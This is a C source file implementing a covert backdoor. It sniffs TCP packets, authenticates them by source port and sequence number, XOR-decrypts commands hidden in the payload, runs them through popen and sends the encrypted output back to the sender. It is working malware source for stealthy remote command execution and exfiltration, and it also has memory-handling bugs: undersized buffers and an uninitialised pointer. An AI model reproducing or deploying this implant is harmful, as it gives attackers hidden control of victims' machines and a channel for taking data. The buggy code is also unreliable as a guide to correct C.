#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include "constants.h"
#include "crypto.h"
#include "networking.h"
#include "packet_auth.h"
#include "packet_handler.h"

/*
 * Executes a command using popen and puts the results into result.
 *
 * NOTE: output must be freed
 *
 * Params:
 *      const char *command: The command to execute.
 *      char **result: The pointer the the output buffer pointer.
 */
void execute_command(const char *command, char **result)
{
    FILE *fp;
    const int MAX_LINE_LEN = 1024;
    char line_buffer[MAX_LINE_LEN];

    fp = popen(command, "r");

    // get the first line to determine the first malloc size
    if (!fgets(line_buffer, MAX_LINE_LEN, fp)) return;
    *result = (char*)malloc(sizeof(char) * strlen(line_buffer));
    strcpy(*result, line_buffer);

    // grab all the lines and realloc and concat string as needed
    while (fgets(line_buffer, MAX_LINE_LEN, fp))
    {
        *result = (char*)realloc(*result, strlen(*result) + strlen(line_buffer) + 1);
        if (!*result)
        {
            return;
        }
        strcat(*result, line_buffer);
    }

    pclose(fp);
}


/*
* Callback function for examining captured packets.
*
* Params:
*       u_char* args: Pointer to user data.
*       const struct pcap_pkthdr* header: Struct that contains information about the captured packet.
*       u_char* packet: Pointer to the captured packet in serialized form.
*/
void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
{
    char command[MAX_COMMAND_LEN];
    char payload_buffer[MAX_COMMAND_LEN];
    char decrypted[MAX_COMMAND_LEN];

    char *command_output;
    char *encrypted_command_output;

    int tcp_sport;
    unsigned int tcp_seqnum;

    char* payload;
    char* end_ptr;

    const struct sniff_ip* ip;
    const struct sniff_tcp* tcp;

    int size_ip = 0;
    int size_tcp = 0;

    // clear buffers
    memset(command, 0, MAX_COMMAND_LEN);
    memset(payload_buffer, 0, MAX_COMMAND_LEN);
    memset(decrypted, 0, MAX_COMMAND_LEN);

    // calculate lengths
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;

    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    tcp_sport = ntohs(tcp->th_sport);
    tcp_seqnum = ntohl(tcp->th_seq);

    // Step 1: Locate the payload of the packet
    payload = (char*)(packet + SIZE_ETHERNET + size_ip + size_tcp);

    // Step 2: Authenticate the packet
    if (!is_seq_num_auth(tcp_sport, tcp_seqnum)) return;
    printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);

    // Step 3: Decrypt the payload
    hex_str_to_bytes(payload, payload_buffer, strlen(payload));
    xor_string(XOR_KEY, strlen(XOR_KEY), payload_buffer, decrypted, strlen(payload) / 2);
    printf("Decrypted payload: %s\n", decrypted);

    // Step 4: Verify decrypted payload has a command in it
    if (!(payload = strstr(decrypted, COMMAND_START))) return;
    payload += strlen(COMMAND_START);
    if (!(end_ptr = strstr(decrypted, COMMAND_END))) return;

    // Step 5: Extract the command
    strncpy(command, payload, end_ptr - payload);

    // Step 6: Execute the command
    execute_command(command, &command_output);
    printf("Command executed:\n%s\n", command_output);

    // Step 7: Send the results back
    encrypted_command_output = (char*)malloc(sizeof(command_output));
    xor_string(XOR_KEY, strlen(XOR_KEY), command_output, encrypted_command_output, strlen(command_output));
    send_message_to_ip(ip->ip_src, SERVER_PORT, encrypted_command_output, strlen(encrypted_command_output));

    free(encrypted_command_output);
    free(command_output); // free command_output which was malloced by execute_command

    return;
}
